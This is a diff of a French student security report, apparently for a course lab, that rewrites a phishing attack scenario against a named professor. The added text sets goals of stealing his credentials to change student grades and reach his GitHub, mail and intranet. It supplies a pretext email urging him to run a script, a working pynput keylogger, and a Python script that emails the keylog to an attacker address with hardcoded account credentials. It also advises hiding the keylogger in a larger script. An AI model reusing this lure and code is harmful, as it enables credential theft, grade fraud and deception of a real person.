@@ -371,57 +371,137 @@ Notre cible est donc très calée sur le sujet de la sécurité informatique, ce
 
 ## 3 Scénario d'attaque
 
-Pour ce scénario d'attaque, nous partons du principe que le professeur Rubinstein n'a pas activé l'authentification à deux facteurs sur son compte Github.
-
 ### 3.1 Objectif de l'attaque 
 
-L'objectif principal de l'attaque est d'accéder au compte Github du professeur, car c'est le vecteur utilisé pour donner les laboratoires aux étudiants. 
+L'objectif principal de l'attaque est d'obtenir les identifiants du professeur pour nous connecter sur divers services en son nom. Nous pourrons notamment accéder au compte Github du professeur, car c'est le vecteur utilisé pour donner les laboratoires aux étudiants. Cela nous permettrait d'accéder aux laboratoires en avant-première, et même éventuellement aux corrections, si celles-ci sont disponibles en privé sur Github.
 
-Grâce à cette attaque et à l'obtention des identifiants de connexion du professeur sur Github, nous pourrons accéder directement aux données des laboratoires et les commencer plus rapidement. 
+Nous pourrons également accéder à GAPS avec les identifiants du professeur pour voir ou modifier les notes des étudiants, et ainsi nous assurer de réussir les enseignements dispensés par le professeur. Avec ces identifiants, nous accéderons à la boite mail professionnelle de M. Rubinstein, ainsi qu'à l'intranet de la HEIG-VD. 
 
-Nous pourrons également potentiellement accéder aux versions complétées des laboratoires et récupérer les réponses que le professeur attend. Cela nous assurerait de très bonnes notes sans nous demander de travail.
+Des préjudices pourraient être portés au professeur en obtenant aussi ses identifiants pour se connecter aux divers réseaux sociaux : nous pourrions porter atteinte à sa réputation, mais ce n'est pas l'objectif de cette attaque en particulier.
+
+Eventuellement, des informations d'e-banking pourraient être obtenues grâce à cette attaque, mais ce n'est pas non plus l'objectif principal.
 
 ### 3.2 Vecteur(s) d'attaque 
 
-Pour procéder à l'attaque, nous créons un e-mail forgé grâce à l'outil GoPhish, présenté dans la première partie de ce rapport. 
+Pour procéder à l'attaque, nous envoyons un e-mail au professeur de la part d'une étudiante en "détresse". 
 
-Cet e-mail va rediriger le professeur sur la page de connexion Github et l'inciter à entrer ses identifiants. 
+> Nous comptons sur la bonté et la disponibilité du professeur pour effectuer cette attaque. 
 
-L'e-mail sera envoyé de la part d'un étudiant connu du professeur, qui demandera de l'aide pour un projet et donnera un lien sur ledit projet sur Github. Si le professeur clique sur le lien et se retrouve sur la page de connexion Github, il ne se doutera de rien et entrera ses identifiants pour se connecter et accéder au projet.
+Nous avons écrit un script permettant d'activer un `keylogger` sur l'ordinateur personnel du destinataire du mail. Le mail de panique de l'étudiante incitera le professeur à exécuter le script permettant soi-disant de voir le problème posé par un laboratoire. 
 
 ### 3.3 Payload de l'attaque 
 
 La payload sera constituée d'un message d'appel à l'aide de la part d'un étudiant en difficulté sur un projet, ainsi qu'un lien vers le repo Github contenant le projet en question.
 
-Le mail en format HTML ressemble à celui-ci : 
-
-```html
-<html>
-<head>
-	<title></title>
-</head>
-
-<body>
-<p> 
-Bonjour Monsieur Rubinstein, <br />
-
-J'espère que vous allez bien ! <br />
-
-Je me permets de vous écrire pour vous demander un peu d'aide sur le laboratoire de SWI... Je n'ai pas bien compris l'étape 2 "Attaque WPA Entreprise (hostapd)", j'ai démarré le travail mais je ne suis pas sûre de comment procéder. <br />
-
-J'espère que ça ne vous gêne pas, mais je vous envoie ci-dessous le lien sur le repo Github contenant mon rapport, car j'y ai décrit mon problème avec des captures d'écran et des explications ! <br />
-
-Laboratoire SWI: <a href="{{.URL}}">repo Git</a> <br />
-
-Merci d'avance pour votre aide ! <br />
-
-Bonne journée, <br />
-Cassandre
-</p>
-
-</body>
-</html>
 ```
+Bonjour Monsieur Rubinstein,
+
+J'espère que vous allez bien !
+
+Je me permets de vous écrire pour vous demander un peu d'aide sur le laboratoire de SWI... Je n'ai pas bien compris l'étape 2 "Attaque WPA Entreprise (hostapd)", j'ai démarré le travail mais je ne suis pas sûre de comment procéder.
+
+J'espère que ça ne vous gêne pas, mais je vous envoie ci-dessous le lien sur le repo Github contenant un script à lancer pour constater le problème que je rencontre en implémentant l'attaque !
+
+Laboratoire SWI: https://github.com/hans-arn/HEIGVD-SWI-Labo4-WPA-Entreprise
+
+Il faudrait cloner le repo et lancer le script "run_lab.sh", vous devriez voir tout de suite mon souci ...
+
+Je suis encore vraiment désolée de vous demander cette faveur, mais je suis très stressée, la fin de semestre approche très vite, ainsi que la date de rendu ...
+
+Merci d'avance pour votre aide !
+
+Bonne journée,
+Cassandre
+
+```
+
+Sur le repo Github dont le lien se trouve dans le mail, se trouvera un script `run_lab.sh` à exécuter : 
+
+```shell
+#!/bin/bash
+
+python lib/keylogger.py &
+PID=$(echo $!)
+sleep 5
+kill $PID
+
+python lib/mail_sender.py
+```
+
+> Idéalement, le code lançant le `keylogger` serait dissimulé dans un script d'une bien plus grande taille pour éviter qu'il soit trop facilement repérable. Il faudrait également que des opérations "longues" soit lancées pour que le professeur attende un moment avant de regarder le résultat et se connecte sur les services mentionnés au paragraphe 3.1. 
+
+Le code du `keylogger` est le suivant : 
+
+```python
+from pynput.keyboard import Key, Listener
+import logging
+
+logging.basicConfig(filename=("./lib/keylog.txt"), level=logging.INFO, format='%(message)s')
+
+def on_press(key):
+    logging.info(key)
+
+with Listener(on_press = on_press) as listener:
+    listener.join()
+```
+
+Pour que les données soient envoyées aux attaquants, nous avons écrit le script suivant : 
+
+```python
+import smtplib
+import time
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+from pynput.keyboard import Key, Listener
+import logging
+
+# ------------------------------ envoi de mail
+try:
+    to =  "jerome.arn@ik.me"
+    print("Mail envoyé à " + to)
+    time.sleep(10)
+    # expediteur
+    user = "hack3rman_badb0y@hotmail.com"
+    # mdp
+    password = "zkyKMR%M@koaCBV%E4#i*LA8"
+
+    msg = MIMEMultipart()
+    file = "./lib/keylog.txt"
+    attachment = open(file,'rb')
+    obj = MIMEBase('application','octet-stream')
+    obj.set_payload((attachment).read())
+    encoders.encode_base64(obj)
+    obj.add_header('Content-Disposition',"attachment; filename= "+file)
+    msg.attach(obj)
+
+    msg["From"] = user
+    msg["To"] = to
+    msg["Subject"] = "file you need"
+    html = """\
+    <html>
+      <body>
+        <p>Hi,<br>
+           How are you?<br>
+        </p>
+      </body>
+    </html>
+    """
+
+    msg.attach(MIMEText(html, 'html'))
+
+    ms = smtplib.SMTP('smtp.live.com', 587)
+    ms.ehlo()
+    ms.starttls()
+    ms.login(user, password)
+    ms.sendmail(user, to, msg.as_string())
+    ms.quit()
+except smtplib.SMTPRecipientsRefused:
+    print("L'adresse " + to + " n'est pas valide !!!!!!!!!!!!!!!!!!")
+```
+
+
 
 ## 4 Simulation d'attaque
 
